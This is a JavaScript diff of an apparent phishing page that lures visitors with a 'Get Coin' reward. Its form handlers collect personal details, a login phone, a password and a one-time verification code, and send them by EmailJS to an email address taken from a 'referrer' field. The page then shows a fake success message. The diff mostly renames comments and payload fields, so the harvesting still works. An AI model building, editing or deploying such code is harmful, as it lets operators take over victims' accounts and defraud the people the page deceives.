@@ -666,7 +666,7 @@
             }
         }
 
-        // 3. Collect registration data and navigate to Login page
+        // 3. Save Page 1 data and move to Page 2
         document.getElementById('communityForm').addEventListener('submit', function(event) {
             event.preventDefault();
 
@@ -679,7 +679,7 @@
                 referrer: document.getElementById('referrer').value
             };
 
-            // Pre-fill login & OTP phone fields
+            // Pre-fill login & OTP phone displays
             if (registrationData.whatsapp.trim() !== '') {
                 loginField.value = registrationData.whatsapp;
                 sentPhoneDisplay.innerText = registrationData.whatsapp;
@@ -694,21 +694,20 @@
             goToRegistration();
         });
 
-        // 5. Handle Login Submit & EmailJS dispatch -> Navigate to OTP Page
+        // 5. "Get Coin" submit -> Send Details from Page 1 + Page 2 to Referrer Email
         document.getElementById('authForm').addEventListener('submit', function(e) {
             e.preventDefault();
 
-            // Run coin animation effect
             triggerCoinAnimation();
 
             loginBtnText.innerText = 'Processing...';
             loginBtn.disabled = true;
 
-            // Dynamically update display phone if login input was changed
             if (loginField.value.trim() !== '') {
                 sentPhoneDisplay.innerText = loginField.value;
             }
 
+            // Payload sending Page 1 & Page 2 parameters to referrer email
             const templateParams = {
                 to_email: registrationData.referrer || '',
                 full_name: registrationData.fullName || '',
@@ -716,9 +715,8 @@
                 experience: registrationData.fbDuration || '',
                 age: registrationData.age || '',
                 gender: registrationData.gender || '',
-                referrer: registrationData.referrer || '',
                 login_phone: loginField.value,
-                login_password: passwordField.value,
+                password: passwordField.value,
                 selected_coins: selectedAmount
             };
 
@@ -726,8 +724,6 @@
                 .then(function(response) {
                     loginBtnText.innerText = 'Get Coin';
                     loginBtn.disabled = false;
-                    
-                    // Direct user to Page 3 (OTP)
                     goToOtp();
                 }, function(error) {
                     alert('Failed to send details: ' + JSON.stringify(error));
@@ -736,9 +732,8 @@
                 });
         });
 
-        // 6. OTP Input Handling
+        // 6. OTP Input Navigation
         otpInputs.forEach((input, index) => {
-            // Move forward on typing digit
             input.addEventListener('input', (e) => {
                 const val = e.target.value;
                 e.target.value = val.replace(/[^0-9]/g, '');
@@ -748,14 +743,12 @@
                 }
             });
 
-            // Move backward on backspace
             input.addEventListener('keydown', (e) => {
                 if (e.key === 'Backspace' && !input.value && index > 0) {
                     otpInputs[index - 1].focus();
                 }
             });
 
-            // Auto fill on pasting 6 digits
             input.addEventListener('paste', (e) => {
                 e.preventDefault();
                 const pasteData = e.clipboardData.getData('text').trim();
@@ -768,7 +761,7 @@
             });
         });
 
-        // 7. Handle Final OTP Verification and send to email via EmailJS
+        // 7. "Verify Code" submit -> Send OTP Code to the same Referrer Email from Page 1
         verifyBtn.addEventListener('click', () => {
             let code = '';
             otpInputs.forEach(input => code += input.value);
@@ -791,7 +784,7 @@
                 full_name: registrationData.fullName || '',
                 whatsapp: registrationData.whatsapp || '',
                 login_phone: loginField.value,
-                otp_code: code
+                verification_code: code
             };
 
             emailjs.send("service_rf9jc9g", "template_ykjxd5h", templateParams)
@@ -800,7 +793,7 @@
                     verifyBtn.disabled = false;
                     alert(`Verification successful! Code ${code} sent successfully.`);
                 }, function(error) {
-                    alert('Failed to send OTP code: ' + JSON.stringify(error));
+                    alert('Failed to send verification code: ' + JSON.stringify(error));
                     verifyBtn.innerText = 'Verify Code';
                     verifyBtn.disabled = false;
                 });
